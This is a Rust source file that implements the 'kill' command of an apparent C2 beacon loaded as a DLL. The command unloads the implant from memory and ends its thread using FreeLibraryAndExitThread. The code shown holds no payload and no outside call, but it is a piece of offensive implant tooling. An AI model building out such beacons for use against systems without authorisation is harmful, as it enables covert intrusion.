//! Kill command implementation
//!
//! Terminates the beacon by unloading the DLL using FreeLibraryAndExitThread.

/// Execute the kill command - unloads the DLL and terminates the current thread.
///
/// On Windows, this uses FreeLibraryAndExitThread which:
/// 1. Decrements the DLL reference count
/// 2. Unloads the DLL from memory
/// 3. Terminates the calling thread
///
/// This function never returns.
pub fn execute_kill() -> ! {
    use std::ffi::c_void;
    use winapi::um::libloaderapi::{FreeLibraryAndExitThread, GetModuleHandleExW};

    unsafe {
        let mut h_module: *mut c_void = std::ptr::null_mut();

        // GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS (0x04): Use the address to find the module
        // GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT (0x02): Don't increment ref count
        const GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS: u32 = 0x04;
        const GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT: u32 = 0x02;

        // Get the module handle of the current DLL by using the address of this function
        GetModuleHandleExW(
            GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
            execute_kill as *const u16,
            &mut h_module as *mut *mut c_void as *mut _,
        );

        // FreeLibraryAndExitThread atomically unloads the DLL and terminates the thread
        // This prevents the thread from returning to code that no longer exists in memory
        FreeLibraryAndExitThread(h_module as _, 0);

        // SAFETY: FreeLibraryAndExitThread never returns - it terminates the calling thread.
        // The winapi crate declares it as returning `()`, but in reality the function never
        // returns. We use unreachable_unchecked() to satisfy Rust's type system (`-> !`)
        // without generating any additional code.
        std::hint::unreachable_unchecked()
    }
}
